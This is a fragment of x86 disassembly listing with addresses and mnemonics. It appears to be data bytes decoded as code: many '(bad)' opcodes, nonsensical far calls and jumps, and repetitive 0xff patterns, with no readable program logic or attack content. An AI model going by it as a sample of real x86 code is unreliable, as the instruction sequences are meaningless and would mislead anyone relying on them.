  42c933:	dec    DWORD PTR [ebx-0x6f00ceb1]
  42c939:	inc    ebx
  42c93a:	sub    esi,ecx
	...
  42c94c:	xchg   ebx,eax
  42c94d:	ss and eax,0x1b277371
  42c953:	push   DWORD PTR [esi+0x25]
  42c956:	sbb    edi,edi
  42c958:	jge    0x42c983
  42c95a:	push   ds
  42c95b:	inc    DWORD PTR [ebp+ebp*1+0x2f8bff20]
  42c962:	and    edi,edi
  42c964:	xchg   ecx,eax
  42c965:	xor    al,0x24
  42c967:	call   FWORD PTR [eax+0x7fff3046]
  42c96d:	push   esp
  42c96e:	sub    eax,0x2b527bff
  42c973:	call   FWORD PTR [eax+0x67]
  42c976:	and    eax,0x26833eff
  42c97b:	jmp    DWORD PTR [edx+0x78]
  42c97e:	xor    edi,edi
  42c980:	inc    eax
  42c981:	xchg   edi,eax
  42c982:	sub    al,0xff
  42c984:	arpl   WORD PTR [esi+0x2e],di
  42c987:	inc    DWORD PTR [edx-0x7400c790]
  42c98d:	jne    0x42c9cd
  42c98f:	call   DWORD PTR [edi-0x5d00cdad]
  42c995:	push   edx
  42c996:	das    
  42c997:	(bad)  
  42c998:	mov    ecx,0xbeff3860
  42c99d:	fs cmp al,0xff
  42c9a0:	mov    esi,0xbeff3d63
  42c9a5:	bound  edi,QWORD PTR ds:0x3d61bcff
  42c9ab:	(bad)  
  42c9ac:	mov    ebx,0xbaff3c5c
  42c9b1:	push   edi
  42c9b2:	cmp    bh,bh
  42c9b4:	mov    ecx,0xb7ff3852
  42c9b9:	dec    esp
  42c9ba:	xor    edi,edi
  42c9bc:	mov    ch,0x46
  42c9be:	xor    edi,edi
  42c9c0:	mov    bl,0x41
  42c9c2:	das    
  42c9c3:	jmp    FWORD PTR [edi-0x5400d5c4]
  42c9c9:	cmp    ch,BYTE PTR [ecx]
  42c9cb:	jmp    FWORD PTR [eax-0x5a00d5c8]
  42c9d1:	cmp    ch,BYTE PTR [edx]
  42c9d3:	jmp    DWORD PTR [edx-0x6100d6c6]
  42c9d9:	cmp    al,0x29
  42c9db:	call   FWORD PTR [ebp+edi*1+0x3a93ff2a]
  42c9e2:	sub    bh,bh
  42c9e4:	mov    bh,BYTE PTR [edx]
  42c9e6:	daa    
  42c9e7:	dec    DWORD PTR [ebx-0x7d00d5c0]
  42c9ed:	cmp    esp,DWORD PTR [esi]
  42c9ef:	(bad)  
  42c9f0:	jg     0x42ca2c
  42c9f2:	and    al,0xff
  42c9f4:	mov    cl,BYTE PTR [esi+0x30]
  42c9f7:	dec    DWORD PTR [ecx-0x7103cbad]
  42c9fd:	aas    
  42c9fe:	sub    BYTE PTR [eax+eax*1],bl
	...
  42ca09:	add    BYTE PTR [eax],al
  42ca0b:	add    BYTE PTR [ebx+0x6fb52334],cl
  42ca11:	and    bl,BYTE PTR [ecx]
  42ca13:	push   DWORD PTR [ebp+eiz*1+0x1a]
  42ca17:	(bad)  
  42ca18:	jnp    0x42ca41
  42ca1a:	push   ds
  42ca1b:	inc    DWORD PTR [ebx-0x7900dfd5]
  42ca21:	sub    eax,0x418dff1f
  42ca26:	sub    al,0xff
  42ca28:	xchg   BYTE PTR [edx+0x32],dl
  42ca2b:	inc    DWORD PTR [ecx+eiz*2+0x548dff35]
  42ca32:	xor    edi,edi
  42ca34:	xchg   edx,eax
  42ca35:	push   ebx
  42ca36:	xor    bh,bh
  42ca38:	test   DWORD PTR [ebp+0x30],ebx
  42ca3b:	call   DWORD PTR [edi-0x7000c49a]
  42ca41:	addr16 xor eax,0x305898ff
  42ca47:	jmp    FWORD PTR [eax-0x4f00cba2]
  42ca4d:	fs push DWORD PTR ss:[ecx-0x3f00cea1]
  42ca55:	ins    BYTE PTR es:[edi],dx
  42ca56:	aaa    
  42ca57:	inc    esp
  42ca59:	outs   dx,BYTE PTR ds:[esi]
  42ca5a:	cmp    bh,bh
  42ca5c:	les    ebp,FWORD PTR [esi+0x3c]
  42ca5f:	inc    ebx
  42ca61:	outs   dx,BYTE PTR ds:[esi]
  42ca62:	ds inc ebx
  42ca65:	ins    BYTE PTR es:[edi],dx
  42ca66:	ds inc ecx
  42ca69:	push   0x3f
  42ca6b:	inc    eax
  42ca6d:	push   0x66bfff3f
  42ca72:	aas    
  42ca73:	(bad)  
  42ca74:	mov    esp,0xbaff3d61
  42ca79:	pop    eax
  42ca7a:	cmp    edi,edi
  42ca7c:	mov    ecx,0xb7ff3450
  42ca81:	dec    ecx
  42ca82:	xor    edi,edi
  42ca84:	mov    ah,0x42
  42ca86:	das    
  42ca87:	jmp    FWORD PTR [edi-0x5400d3c4]
  42ca8d:	cmp    ch,BYTE PTR [ecx]
  42ca8f:	jmp    DWORD PTR [edi-0x5a00d6c7]
  42ca95:	cmp    DWORD PTR [ecx],ebp
  42ca97:	jmp    DWORD PTR [edx-0x6200d5c7]
  42ca9d:	cmp    DWORD PTR [ecx],ebp
  42ca9f:	dec    DWORD PTR [esi-0x7c00d7c5]
  42caa5:	push   ecx
  42caa6:	xor    bh,bh
  42caa8:	popa   
  42caa9:	push   0x2e
  42caab:	push   DWORD PTR [ebx+0x52]
  42caae:	cs (bad) 
  42cab0:	jl     0x42caec
  42cab2:	and    eax,0x2c4987ff
  42cab7:	(bad)  
  42cab8:	jl     0x42cb17
  42caba:	xor    al,0xff
  42cabc:	or     BYTE PTR [ecx+0x26],0x65
	...
  42cacc:	xchg   BYTE PTR [ebx],dh
  42cace:	and    bl,ah
  42cad0:	outs   dx,DWORD PTR ds:[esi]
  42cad1:	and    DWORD PTR [edi],edx
  42cad3:	push   DWORD PTR [ebx+0x23]
  42cad6:	sbb    edi,edi
  42cad8:	jp     0x42cb01
  42cada:	sbb    al,0xff
  42cadc:	sub    BYTE PTR [edx],0x1f
  42cadf:	inc    DWORD PTR [edx+0x7aff1f2f]
  42cae5:	dec    esi
  42cae6:	sub    bh,bh
  42cae8:	js     0x42cb48
  42caea:	xor    bh,bh
  42caec:	popf   
  42caed:	push   eax
  42caee:	xor    edi,edi
  42caf0:	test   al,0x50
  42caf2:	sub    al,0xff
  42caf4:	scas   al,BYTE PTR es:[edi]
  42caf5:	push   esi
  42caf6:	sub    bh,bh
  42caf8:	mov    dl,0x5e
  42cafa:	xor    edi,edi
  42cafc:	mov    bl,0x61
  42cafe:	xor    edi,edi
  42cb00:	mov    eax,0xb7ff3064
  42cb05:	gs sub eax,0x316dc1ff
  42cb0b:	inc    ebp
  42cb0d:	jb     0x42cb42
  42cb0f:	inc    esi
  42cb11:	jbe    0x42cb48
  42cb13:	dec    eax
  42cb15:	jns    0x42cb4e
  42cb17:	dec    eax
  42cb19:	jp     0x42cb53
  42cb1b:	dec    eax
  42cb1d:	jp     0x42cb59
  42cb1f:	inc    edi
  42cb21:	jns    0x42cb5f
  42cb23:	dec    eax
  42cb25:	js     0x42cb65
  42cb27:	inc    esi
  42cb29:	je     0x42cb6a
  42cb2b:	inc    ebp
  42cb2d:	jno    0x42cb70
  42cb2f:	inc    esp
  42cb31:	ins    DWORD PTR es:[edi],dx
  42cb32:	inc    ecx
  42cb33:	inc    edx
  42cb35:	imul   eax,DWORD PTR [ecx-0x1],0xffffffbf
  42cb39:	data16 aas 
  42cb3b:	(bad)  
  42cb3c:	mov    esp,0xb9ff3c5d
  42cb41:	push   esi
  42cb42:	cmp    bh,bh
  42cb44:	mov    dh,0x4b
  42cb46:	xor    edi,edi
  42cb48:	mov    ah,0x44
  42cb4a:	das    
  42cb4b:	jmp    FWORD PTR [edi-0x5500d4c4]
  42cb51:	cmp    BYTE PTR [ecx],ch
  42cb53:	jmp    FWORD PTR [eax-0x5c00d7c8]
  42cb59:	cmp    BYTE PTR [eax],ch
  42cb5b:	dec    DWORD PTR [edi-0x7000daca]
  42cb61:	dec    ebx
  42cb62:	xor    al,0xff
  42cb64:	pop    ebx
  42cb65:	jae    0x42cb91
  42cb67:	call   FWORD PTR [ebx]
  42cb69:	sahf   
  42cb6a:	pop    ds
  42cb6b:	jmp    FWORD PTR [esi]
  42cb6d:	(bad)  
  42cb6e:	sub    al,0xff
  42cb70:	push   dx
  42cb72:	sub    al,0xff
  42cb74:	xchg   BYTE PTR [edx+0x2e],cl
  42cb77:	(bad)  
  42cb78:	jle    0x42cbdb
  42cb7a:	xor    eax,0x224a74ff
  42cb7f:	scas   al,BYTE PTR es:[edi]
	...
  42cb8c:	jle    0x42cbbd
  42cb8e:	pop    ds
  42cb8f:	icebp  
  42cb90:	ins    DWORD PTR es:[edi],dx
  42cb91:	and    BYTE PTR [edi],dl
  42cb93:	push   DWORD PTR [ebx+0x22]
  42cb96:	sbb    edi,edi
  42cb98:	jns    0x42cbc0
  42cb9a:	sbb    edi,edi
  42cb9c:	jl     0x42cbc9
  42cb9e:	sbb    eax,0x2c3f86ff
  42cba3:	call   FWORD PTR [ecx+0x71]
  42cba6:	jmp    DWORD PTR es:[edx+0x6d]
  42cbaa:	sub    edi,edi
  42cbac:	mov    ds:0xbdff2e51,al
  42cbb1:	pop    edi
  42cbb2:	sub    bh,bh
  42cbb4:	shl    DWORD PTR [esp+ebp*1-0x1],0xb8
  42cbb9:	popa   
  42cbba:	sub    bh,bh
  42cbbc:	mov    ecx,0xbaff2b67
  42cbc1:	ins    BYTE PTR es:[edi],dx
  42cbc2:	sub    al,0xff
  42cbc4:	mov    esi,0xc4ff3677
  42cbc9:	jge    0x42cc01
  42cbcb:	inc    edi
  42cbcd:	jge    0x42cc00
  42cbcf:	dec    esp
  42cbd1:	xor    DWORD PTR ds:0x3785cdff,0xffffffff
  42cbd8:	int    0x86
  42cbda:	cmp    bh,bh
  42cbdc:	into   
  42cbdd:	test   BYTE PTR [edx],bh
  42cbdf:	dec    ebp
  42cbe1:	cmp    DWORD PTR [edi+edi*8],0xffffffcc
  42cbe5:	cmp    BYTE PTR ds:0x3f7ecaff,0xff
  42cbec:	enter  0x407a,0xff
  42cbf0:	(bad)  
  42cbf1:	jne    0x42cc35
  42cbf3:	inc    esp
  42cbf5:	jb     0x42cc39
  42cbf7:	inc    ebx
  42cbf9:	ins    DWORD PTR es:[edi],dx
  42cbfa:	inc    edx
  42cbfb:	inc    ecx
  42cbfd:	push   0x60bdff42
  42cc02:	ds (bad) 
  42cc04:	mov    ecx,0xb6ff3a55
  42cc09:	dec    esp
  42cc0a:	xor    al,0xff
  42cc0c:	mov    bl,0x44
  42cc0e:	das    
  42cc0f:	jmp    FWORD PTR [esi-0x5400d4c4]
  42cc15:	aaa    
  42cc16:	sub    bh,bh
  42cc18:	pushf  
  42cc19:	ss and eax,0x2c468cff
  42cc1f:	jmp    DWORD PTR [edx+0x7c]
  42cc22:	xor    bh,bh
  42cc24:	and    ah,BYTE PTR [ebx-0x65e500dd]
  42cc2a:	pop    ds
  42cc2b:	call   DWORD PTR ds:0x2fff2099
  42cc31:	jg     0x42cc53
  42cc33:	jmp    FWORD PTR [eax+0x5b]
  42cc36:	sub    al,0xff
  42cc38:	outs   dx,BYTE PTR ds:[esi]
  42cc39:	ins    DWORD PTR es:[edi],dx
  42cc3a:	xor    edi,edi
  42cc3c:	push   0xdc2053
	...
  42cc49:	add    BYTE PTR [eax],al
  42cc4b:	add    BYTE PTR [esi+0x2a],dh
  42cc4e:	sbb    al,0xfb
  42cc50:	ins    BYTE PTR es:[edi],dx
  42cc51:	pop    ds
  42cc52:	push   ss
  42cc53:	push   DWORD PTR [ebx+0x22]
  42cc56:	sbb    edi,edi
  42cc58:	jne    0x42cc81
  42cc5a:	sbb    edi,edi
  42cc5c:	jge    0x42cc99
  42cc5e:	daa    
  42cc5f:	jmp    DWORD PTR [ebp+0x5a]
  42cc62:	daa    
  42cc63:	inc    DWORD PTR [edx-0x70]
  42cc66:	and    eax,0x2f617dff
  42cc6b:	jmp    DWORD PTR [ebx+edx*2+0x67beff29]
  42cc72:	sub    eax,0x3472c2ff
  42cc77:	(bad)  
  42cc78:	mov    ecx,0xa7ff3472
  42cc7d:	cmp    DWORD PTR [ebx],0xffffffff
  42cc80:	scas   eax,DWORD PTR es:[edi]
  42cc81:	mov    BYTE PTR [ecx-0x1],al
  42cc84:	ret    0x498d
  42cc87:	inc    edi
  42cc89:	mov    WORD PTR [eax-0x1],es
  42cc8c:	retf   
  42cc8d:	mov    dh,BYTE PTR [ebx]
  42cc8f:	call   eax
  42cc91:	mov    ?,WORD PTR ds:0x3690d1ff
  42cc97:	call   edx
  42cc99:	xchg   edx,eax
  42cc9a:	aaa    
  42cc9b:	call   edx
  42cc9d:	nop
  42cc9e:	cmp    bh,bh
  42cca0:	rcl    DWORD PTR [eax-0x732e00c5],1
  42cca6:	cmp    al,0xff
  42cca8:	into   
  42cca9:	mov    DWORD PTR [edi+edi*8],edi
  42ccac:	int3   
  42ccad:	test   BYTE PTR [edi],bh
  42ccaf:	dec    edx
  42ccb1:	add    BYTE PTR [ecx-0x1],0xc8
  42ccb5:	jp     0x42ccfa
  42ccb7:	inc    ebp
  42ccb9:	jne    0x42ccfd
  42ccbb:	inc    edx
  42ccbd:	outs   dx,DWORD PTR ds:[esi]
  42ccbe:	inc    ebx
  42ccbf:	inc    edx
  42ccc1:	push   0x42
  42ccc3:	(bad)  
  42ccc4:	mov    ebp,0xb9ff4061
  42ccc9:	push   esi
  42ccca:	cmp    edi,edi
  42cccc:	mov    ch,0x4b
  42ccce:	xor    al,0xff
  42ccd0:	mov    cl,0x41
  42ccd2:	das    
  42ccd3:	jmp    FWORD PTR [ebp-0x6100d4c6]
  42ccd9:	cmp    BYTE PTR [eax],ch
  42ccdb:	inc    DWORD PTR [esi+0x35ff345e]
  42cce1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cce2:	aaa    
  42cce3:	call   FWORD PTR [esi]
  42cce5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cce6:	sub    bh,bh
  42cce8:	and    BYTE PTR [ebx-0x6ce500d1],bl
  42ccee:	sub    al,0xff
  42ccf0:	push   ss
  42ccf1:	xchg   ecx,eax
  42ccf2:	sbb    bh,bh
  42ccf4:	and    al,0x98
  42ccf6:	and    bh,bh
  42ccf8:	cmp    DWORD PTR [edi+0x6255ff27],edx
  42ccfe:	sbb    eax,0xf3
	...
  42cd0b:	add    BYTE PTR [ecx+0x27],dh
  42cd0e:	sbb    bh,dh
  42cd10:	outs   dx,BYTE PTR ds:[esi]
  42cd11:	pop    ds
  42cd12:	push   ss
  42cd13:	push   DWORD PTR [eax+0x26]
  42cd16:	sbb    edi,edi
  42cd18:	add    BYTE PTR [eax+0x2d],0xff
  42cd1c:	bound  ebx,QWORD PTR [edx+0x25]
  42cd1f:	jmp    DWORD PTR [edx]
  42cd21:	xchg   esi,eax
  42cd22:	sbb    edi,edi
  42cd24:	sbb    DWORD PTR [edx+0x33],0xffffffff
  42cd28:	xchg   esi,eax
  42cd29:	dec    ebp
  42cd2a:	sub    bh,bh
  42cd2c:	stos   BYTE PTR es:[edi],al
  42cd2d:	push   esi
  42cd2e:	and    edi,edi
  42cd30:	mov    bh,0x6f
  42cd32:	xor    al,0xff
  42cd34:	mov    cl,0x7c
  42cd36:	cmp    eax,0x4386baff
  42cd3b:	push   DWORD PTR [eax-0x4600b06c]
  42cd41:	call   0xff3d:0x8ec6ff54
  42cd48:	into   
  42cd49:	xchg   ecx,eax
  42cd4a:	xor    edi,edi
  42cd4c:	rcl    DWORD PTR [ebp-0x632900cc],1
  42cd52:	ss call edi
  42cd55:	sahf   
  42cd56:	aaa    
  42cd57:	call   esi
  42cd59:	sahf   
  42cd5a:	cmp    bh,bh
  42cd5c:	(bad)  
  42cd5d:	popf   
  42cd5e:	cmp    bh,bh
  42cd60:	(bad)  
  42cd61:	pushf  
  42cd62:	cmp    edi,edi
  42cd64:	aad    0x99
  42cd66:	cmp    edi,edi
  42cd68:	aam    0x94
  42cd6a:	cmp    eax,0x3d8fd1ff
  42cd6f:	dec    esi
  42cd71:	mov    al,BYTE PTR [ecx-0x1]
  42cd74:	int    0x85
  42cd76:	inc    ebx
  42cd77:	dec    ecx
  42cd79:	jle    0x42cdbf
  42cd7b:	inc    esi
  42cd7d:	ja     0x42cdc4
  42cd7f:	inc    ebp
  42cd81:	jno    0x42cdc8
  42cd83:	inc    edx
  42cd85:	imul   eax,DWORD PTR [edi+edi*8-0x44],0x62
  42cd8a:	inc    eax
  42cd8b:	(bad)  
  42cd8c:	mov    ecx,0xb4ff3a53
  42cd91:	dec    ecx
  42cd92:	xor    bh,bh
  42cd94:	mov    cl,0x3f
  42cd96:	das    
  42cd97:	jmp    DWORD PTR [eax-0x7600d7c7]
  42cd9d:	push   esi
  42cd9e:	xor    bh,bh
  42cda0:	cmp    eax,0x21ff51ae
  42cda5:	scas   al,BYTE PTR es:[edi]
  42cda6:	dec    esp
  42cda7:	jmp    DWORD PTR [eax]
  42cda9:	mov    eax,ds:0x9e1eff46
  42cdae:	inc    ecx
  42cdaf:	call   FWORD PTR [edx]
  42cdb1:	pushf  
  42cdb2:	xor    bh,bh
  42cdb4:	sbb    edx,DWORD PTR [edi-0x6dcf00df]
  42cdba:	pop    ds
  42cdbb:	dec    DWORD PTR [eax+0x74]
  42cdbe:	push   ds
  42cdbf:	cli    
	...
  42cdcc:	jo     0x42cdf6
  42cdce:	sbb    edi,edi
  42cdd0:	outs   dx,BYTE PTR ds:[esi]
  42cdd1:	and    DWORD PTR [edi],edx
  42cdd3:	push   DWORD PTR [ebp+0x35]
  42cdd6:	and    edi,edi
  42cdd8:	popa   
  42cdd9:	pop    ebp
  42cdda:	sub    bh,bh
  42cddc:	inc    esi
  42cddd:	and    BYTE PTR [edi+edi*8],0x38
  42cde1:	xchg   BYTE PTR [esi],bl
  42cde3:	push   DWORD PTR [esi+0x58]
  42cde6:	jmp    DWORD PTR cs:[edi-0x5000d0a5]
  42cded:	data16 das 
  42cdef:	jmp    DWORD PTR [ecx-0x6200cc8e]
  42cdf5:	xchg   DWORD PTR [ecx-0x1],eax
  42cdf8:	mov    ecx,0xc6ff3c85
  42cdfd:	mov    edi,DWORD PTR [ecx]
  42cdff:	inc    esp
  42ce01:	lea    esi,[edi+edi*8]
  42ce04:	(bad)  
  42ce05:	(bad)  
  42ce06:	cs call edi
  42ce09:	mov    ds:0xa5d9ff37,al
  42ce0e:	cmp    bh,bh
  42ce10:	fld    TBYTE PTR [ecx-0x542400c7]
  42ce16:	cmp    al,0xff
  42ce18:	fsubr  QWORD PTR [edx-0x572400c5]
  42ce1e:	cmp    al,0xff
  42ce20:	fisub  DWORD PTR [edi-0x5c2600c4]
  42ce26:	cmp    al,0xff
  42ce28:	fcomp  DWORD PTR [edi-0x662a00c3]
  42ce2e:	notrack call ebx
  42ce31:	xchg   esp,eax
  42ce32:	inc    ecx
  42ce33:	call   eax
  42ce35:	pop    DWORD PTR [edi+edi*8-0x33]
  42ce39:	xchg   DWORD PTR [ebp-0x1],eax
  42ce3c:	leave  
  42ce3d:	add    BYTE PTR [edi-0x1],0xc6
  42ce41:	js     0x42ce8a
  42ce43:	inc    esp
  42ce45:	jno    0x42ce8d
  42ce47:	(bad)  
  42ce48:	mov    edi,0xbdff4469
  42ce4d:	pop    edi
  42ce4e:	inc    eax
  42ce4f:	push   DWORD PTR [edi-0x4c00c7ae]
  42ce55:	inc    ebp
  42ce56:	xor    bh,bh
  42ce58:	popf   
  42ce59:	aas    
  42ce5a:	sub    al,0xff
  42ce5c:	mov    ss,WORD PTR [ecx+esi*1-0x1]
  42ce60:	dec    ebx
  42ce61:	ret    
  42ce62:	ins    DWORD PTR es:[edi],dx
  42ce63:	push   DWORD PTR [esp+eax*8]
  42ce66:	je     0x42ce67
  42ce68:	das    
  42ce69:	mov    ah,0x65
  42ce6b:	jmp    DWORD PTR [edi]
  42ce6d:	mov    al,0x55
  42ce6f:	call   FWORD PTR [edi]
  42ce71:	stos   BYTE PTR es:[edi],al
  42ce72:	inc    esp
  42ce73:	call   FWORD PTR [esi]
  42ce75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ce76:	xor    eax,0x2fa133ff
  42ce7b:	inc    DWORD PTR [ecx+0x7f]
  42ce7e:	and    al,0xfd
	...
  42ce8c:	jne    0x42ceb8
  42ce8e:	sbb    bh,dh
  42ce90:	je     0x42cec1
  42ce92:	and    bh,bh
  42ce94:	fs dec eax
  42ce96:	and    edi,edi
  42ce98:	sub    bl,BYTE PTR [edx+eiz*1+0x2d4f74ff]
  42ce9f:	dec    DWORD PTR [ebx-0x7a00c9ae]
  42cea5:	pusha  
  42cea6:	xor    bh,bh
  42cea8:	scas   eax,DWORD PTR es:[edi]
  42cea9:	outs   dx,BYTE PTR ds:[esi]
  42ceaa:	aas    
  42ceab:	call   FWORD PTR [edi-0x5c00c384]
  42ceb1:	xchg   DWORD PTR [eax-0x1],eax
  42ceb4:	mov    esp,0xbdff3f8b
  42ceb9:	test   BYTE PTR ds:0x329bd2ff,ch
  42cebf:	(bad)  
  42cec0:	(bad)  [edi-0x512200c8]
  42cec6:	cmp    edi,edi
  42cec8:	fidiv  WORD PTR [ecx-0x4b2100c3]
  42cece:	cmp    eax,0x3eb5e0ff
  42ced3:	jmp    eax
  42ced5:	mov    dh,0x3f
  42ced7:	jmp    eax
  42ced9:	mov    ch,0x3f
  42cedb:	(bad)  
  42cedc:	fbstp  TBYTE PTR [eax+eax*2+0x40b2dfff]
  42cee3:	(bad)  
  42cee4:	fisubr WORD PTR [esi-0x572400c1]
  42ceea:	aas    
  42ceeb:	(bad)  
  42ceec:	fldenv [ebx-0x612900c0]
  42cef2:	inc    edx
  42cef3:	call   ebp
  42cef5:	xchg   edi,eax
  42cef6:	inc    ebp
  42cef7:	call   eax
  42cef9:	nop
  42cefa:	inc    edi
  42cefb:	dec    esp
  42cefd:	mov    BYTE PTR [edx-0x1],cl
  42cf00:	enter  0x4a80,0xff
  42cf04:	lds    esi,FWORD PTR [edi+0x49]
  42cf07:	inc    edx
  42cf09:	jo     0x42cf52
  42cf0b:	inc    eax
  42cf0d:	push   0x5abaff44
  42cf12:	cmp    eax,0x364db6ff
  42cf17:	call   FWORD PTR [edi-0x7d00ceb7]
  42cf1d:	jnp    0x42cf66
  42cf1f:	call   DWORD PTR [eax-0x2d]
  42cf22:	xchg   bh,bh
  42cf24:	push   edx
  42cf25:	ror    BYTE PTR [ecx-0x7b30ad01],1
  42cf2b:	(bad)  
  42cf2c:	aas    
  42cf2d:	lds    ebp,FWORD PTR [esi-0x1]
  42cf30:	and    al,0xb4
  42cf32:	dec    edi
  42cf33:	jmp    DWORD PTR [ecx+esi*4]
  42cf36:	inc    esp
  42cf37:	push   DWORD PTR [edi]
  42cf39:	scas   eax,DWORD PTR es:[edi]
  42cf3a:	cmp    eax,0x287f45ff
  42cf3f:	stc    
	...
  42cf4c:	jnp    0x42cf7a
  42cf4e:	sbb    eax,0x253974fa
  42cf53:	push   DWORD PTR [edi]
  42cf55:	ins    BYTE PTR es:[edi],dx
  42cf56:	push   ss
  42cf57:	push   DWORD PTR [ecx]
  42cf59:	mov    ebx,DWORD PTR [edi]
  42cf5b:	inc    DWORD PTR [ebx+eax*2+0x4891ff2d]
  42cf62:	sub    eax,0x2a54a2ff
  42cf67:	jmp    FWORD PTR [edi-0x4c00d19b]
  42cf6d:	cmp    BYTE PTR [edi+edi*8],0xc0
  42cf71:	lea    eax,[ebx-0x1]
  42cf74:	(bad)  
  42cf75:	nop
  42cf76:	ss call ebx
  42cf79:	sahf   
  42cf7a:	xor    edi,edi
  42cf7c:	(bad)  [ebp-0x4b2000c7]
  42cf82:	cmp    al,0xff
  42cf84:	loope  0x42cf3f
  42cf86:	inc    ecx
  42cf87:	jmp    ebx
  42cf89:	mov    esp,0xc0e4ff43
  42cf8e:	inc    ebx
  42cf8f:	jmp    ebp
  42cf91:	ret    0xff46
  42cf94:	in     eax,0xc2
  42cf96:	inc    esi
  42cf97:	jmp    ebp
  42cf99:	rol    BYTE PTR [esi-0x1],0xe4
  42cf9d:	mov    edi,0xbae2ff44
  42cfa2:	inc    esp
  42cfa3:	jmp    ecx
  42cfa5:	mov    dh,0x41
  42cfa7:	(bad)  
  42cfa8:	fidiv  WORD PTR [ecx-0x532300bf]
  42cfae:	inc    ecx
  42cfaf:	(bad)  
  42cfb0:	fisub  DWORD PTR [ebp-0x5f2800be]
  42cfb6:	inc    ebp
  42cfb7:	call   edx
  42cfb9:	xchg   edi,eax
  42cfba:	dec    eax
  42cfbb:	dec    esi
  42cfbd:	(bad)  
  42cfbe:	dec    ebx
  42cfbf:	dec    ebx
  42cfc1:	xchg   BYTE PTR [edi+edi*8-0x39],cl
  42cfc5:	jle    0x42d013
  42cfc7:	inc    esp
  42cfc9:	jne    0x42d016
  42cfcb:	inc    eax
  42cfcd:	ins    DWORD PTR es:[edi],dx
  42cfce:	dec    eax
  42cfcf:	(bad)  
  42cfd0:	mov    ebp,0xb8ff4263
  42cfd5:	push   esp
  42cfd6:	cmp    bh,bh
  42cfd8:	mov    al,ds:0x84ff324a
  42cfdd:	(bad)  
  42cfde:	pop    eax
  42cfdf:	call   DWORD PTR [ebx-0x28]
  42cfe2:	xchg   esp,eax
  42cfe3:	call   DWORD PTR [eax-0x2e]
  42cfe6:	mov    edi,?
  42cfe8:	dec    ebx
  42cfe9:	(bad)  
  42cfea:	mov    edi,edi
  42cfec:	inc    ebx
  42cfed:	int3   
  42cfee:	ja     0x42cfef
  42cff0:	xor    al,0xcc
  42cff2:	push   DWORD PTR [bx+si]
  42cff5:	les    ebx,FWORD PTR [eax-0x1]
  42cff8:	aas    
  42cff9:	mov    edx,0x7954ff46
  42cffe:	sub    dh,al
	...
  42d00c:	sub    BYTE PTR [edi],0x20
  42d00f:	lock js 0x42d04e
  42d012:	es (bad) 
  42d014:	cmp    al,0x79
  42d016:	sbb    al,0xff
  42d018:	sub    eax,0x81ff1c8f
  42d01d:	inc    ebp
  42d01e:	sub    al,0xff
  42d020:	xchg   edx,eax
  42d021:	inc    ebx
  42d022:	jmp    FWORD PTR es:[edi-0x4700d7a4]
  42d029:	ins    BYTE PTR es:[edi],dx
  42d02a:	sub    bh,bh
  42d02c:	mov    edx,0xa2ff3d85
  42d031:	xchg   ebx,eax
  42d032:	inc    esp
  42d033:	(bad)  
  42d034:	mov    esp,0xd7ff3c94
  42d039:	test   al,0x37
  42d03b:	jmp    edx
  42d03d:	mov    ecx,0xbee3ff3f
  42d042:	inc    esp
  42d043:	jmp    esi
  42d045:	les    eax,FWORD PTR [edi-0x1]
  42d048:	call   0xeb421b16
  42d04d:	int    0x4e
  42d04f:	(bad)  
  42d050:	jmp    0x50cf:0xebff52cd
  42d057:	(bad)  
  42d058:	jmp    0x4dcb:0xe9ff4fcd
  42d05f:	jmp    edi
  42d061:	(bad)  
  42d062:	dec    esp
  42d063:	jmp    ebp
  42d065:	ret    0xff4d
  42d068:	jecxz  0x42d026
  42d06a:	dec    ebx
  42d06b:	(bad)  
  42d06c:	fidiv  WORD PTR [esi+eax*2+0x45acdbff]
  42d073:	(bad)  
  42d074:	fldenv [esi-0x622b00ba]
  42d07a:	dec    ecx
  42d07b:	call   eax
  42d07d:	xchg   esp,eax
  42d07e:	dec    esp
  42d07f:	dec    ebp
  42d081:	mov    WORD PTR [edi-0x1],cs
  42d084:	leave  
  42d085:	test   BYTE PTR [edi-0x1],cl
  42d088:	(bad)  
  42d089:	jnp    0x42d0d9
  42d08b:	inc    ebx
  42d08d:	jb     0x42d0da
  42d08f:	(bad)  
  42d090:	mov    edi,0xbaff4368
  42d095:	pop    ebx
  42d096:	notrack jmp DWORD PTR [edx-0x7400cab3]
  42d09d:	js     0x42d0e5
  42d09f:	call   DWORD PTR [ecx-0x2c]
  42d0a2:	xchg   ecx,eax
  42d0a3:	inc    DWORD PTR [esi-0x2c]
  42d0a6:	(bad)  
  42d0a7:	(bad)  
  42d0a8:	cmp    dh,cl
  42d0aa:	cmp    bh,0x39
  42d0ad:	(bad)  
  42d0ae:	js     0x42d0af
  42d0b0:	cmp    al,0xd4
  42d0b2:	js     0x42d0b3
  42d0b4:	cmp    cl,bl
  42d0b6:	dec    DWORD PTR fs:[ebx-0x3c]
  42d0ba:	push   ebx
  42d0bb:	jmp    FWORD PTR [ecx+0x6f]
  42d0be:	xor    cl,bl
	...
  42d0cc:	mov    WORD PTR [edi],?
  42d0ce:	and    eax,0x25387bdc
  42d0d3:	dec    DWORD PTR [edx+ebp*2+0x20]
  42d0d7:	call   DWORD PTR [ecx]
  42d0d9:	scas   eax,DWORD PTR es:[edi]
  42d0da:	adc    edi,edi
  42d0dc:	outs   dx,BYTE PTR ds:[esi]
  42d0dd:	pusha  
  42d0de:	call   DWORD PTR cs:[esp+ecx*2+0x60acff2b]
  42d0e6:	sub    bh,bh
  42d0e8:	scas   al,BYTE PTR es:[edi]
  42d0e9:	push   0x2c
  42d0eb:	jmp    FWORD PTR [esi-0x5b00c281]
  42d0f1:	lahf   
  42d0f2:	dec    ebp
  42d0f3:	push   DWORD PTR [edi-0x2600c36f]
  42d0f9:	mov    al,0x3a
  42d0fb:	jmp    edi
  42d0fd:	les    eax,FWORD PTR [edi-0x1]
  42d100:	jmp    0x51d2:0xedff4dcc
  42d107:	(bad)  
  42d108:	out    dx,al
  42d109:	(bad)  
  42d10a:	push   edi
  42d10b:	(bad)  
  42d10c:	out    dx,eax
  42d10d:	fcomp  DWORD PTR [edx-0x1]
  42d110:	out    dx,eax
  42d111:	ficomp DWORD PTR [ebx-0x1]
  42d114:	lock fistp DWORD PTR [edx-0x1]
  42d118:	out    dx,eax
  42d119:	ficomp DWORD PTR [eax-0x1]
  42d11c:	out    dx,al
  42d11d:	(bad)  
  42d11e:	push   esp
  42d11f:	(bad)  
  42d120:	in     eax,dx
